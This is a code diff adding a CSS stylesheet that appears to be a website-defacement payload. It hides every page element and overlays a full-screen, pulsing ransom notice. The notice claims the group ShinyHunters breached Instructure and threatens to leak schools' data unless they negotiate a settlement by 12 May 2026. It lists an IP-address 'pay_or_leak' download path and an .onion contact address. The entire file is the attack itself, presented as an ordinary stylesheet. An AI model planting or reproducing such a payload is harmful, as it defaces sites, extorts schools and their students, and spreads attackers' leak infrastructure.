@@ -1,0 +1,107 @@
+@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Rajdhani:wght@600&family=Fira+Code:wght@400;600&family=Share+Tech+Mono&display=swap');
+
+html, body {
+  height: 100% !important;
+  overflow: hidden !important;
+  margin: 0 !important;
+  padding: 0 !important;
+}
+
+body > * {
+  display: none !important;
+}
+
+body {
+  display: flex !important;
+  align-items: center !important;
+  justify-content: center !important;
+  background: #07080c !important;
+}
+
+body::before {
+  content: "" !important;
+  position: fixed !important;
+  inset: 0 !important;
+  z-index: 999998 !important;
+  background:
+    radial-gradient(ellipse at 50% 20%, rgba(255,59,59,.06), transparent 55%),
+    radial-gradient(ellipse at 50% 85%, rgba(125,70,152,.04), transparent 45%),
+    repeating-linear-gradient(0deg, rgba(255,255,255,.035), rgba(255,255,255,.035) 1px, transparent 1px, transparent 3px),
+    #07080c !important;
+  pointer-events: none !important;
+}
+
+body::after {
+  content:
+    "\A\A"
+    "S H I N Y H U N T E R S"
+    "\A"
+    "rooting your systems since '19  ;)"
+    "\A\A\A"
+    "ShinyHunters has breached Instructure (again)."
+    "\A"
+    "Instead of contacting us to resolve it they"
+    "\A"
+    "ignored us and did some \201Csecurity patches\201D."
+    "\A\A"
+    "\26A0   W A R N I N G"
+    "\A\A"
+    "If any of the schools in the affected list are"
+    "\A"
+    "interested in preventing the release of their"
+    "\A"
+    "data, please consult with a cyber advisory firm"
+    "\A"
+    "and contact us privately at TOX to negotiate a"
+    "\A"
+    "settlement. You have till the end of the day by"
+    "\A"
+    "12 May 2026 before everything is leaked."
+    "\A\A"
+    "Instructure still has until EOD 12 May 2026"
+    "\A"
+    "to contact us."
+    "\A\A"
+    "  \25BC  DOWNLOAD AFFECTED_SCHOOLS.TXT  \25BC"
+    "\A"
+    "91.215.85.103/pay_or_leak/"
+    "\A"
+    "instructure_affected_schools_list.txt"
+    "\A\A"
+    "visit us: shnyhntww34phqoa6dcgnvps2yu7dlwzmy5"
+    "\A"
+    "lkvejwjdo6z7bmgshzayd.onion" !important;
+
+  position: fixed !important;
+  z-index: 999999 !important;
+  top: 50% !important;
+  left: 50% !important;
+  transform: translate(-50%, -50%) !important;
+  white-space: pre !important;
+  text-align: center !important;
+  font-family: 'Fira Code', 'Share Tech Mono', monospace !important;
+  font-size: clamp(10px, 1.4vw, 14px) !important;
+  line-height: 1.55 !important;
+  color: #c8dce8 !important;
+  background:
+    linear-gradient(180deg, rgba(255,255,255,.05) 0%, rgba(255,255,255,.01) 3.2%, transparent 3.2%) !important;
+  background-color: #0d0f16 !important;
+  border: 2px solid #ff3b3b !important;
+  border-radius: 14px !important;
+  padding: 16px 32px !important;
+  overflow: hidden !important;
+  box-shadow:
+    0 0 35px rgba(255,59,59,.2),
+    0 40px 90px rgba(0,0,0,.65),
+    inset 0 0 0 1px rgba(255,255,255,.06),
+    inset 0 0 50px rgba(255,59,59,.03) !important;
+  animation: pulseWarn 2.5s infinite ease-in-out !important;
+  max-width: 94vw !important;
+  text-shadow: 0 0 6px rgba(200,220,232,.15) !important;
+}
+
+@keyframes pulseWarn {
+  0%   { box-shadow: 0 0 20px rgba(255,59,59,.15), 0 40px 90px rgba(0,0,0,.65), inset 0 0 0 1px rgba(255,255,255,.06); }
+  50%  { box-shadow: 0 0 55px rgba(255,59,59,.4),  0 40px 90px rgba(0,0,0,.65), inset 0 0 0 1px rgba(255,255,255,.06); }
+  100% { box-shadow: 0 0 20px rgba(255,59,59,.15), 0 40px 90px rgba(0,0,0,.65), inset 0 0 0 1px rgba(255,255,255,.06); }
+}
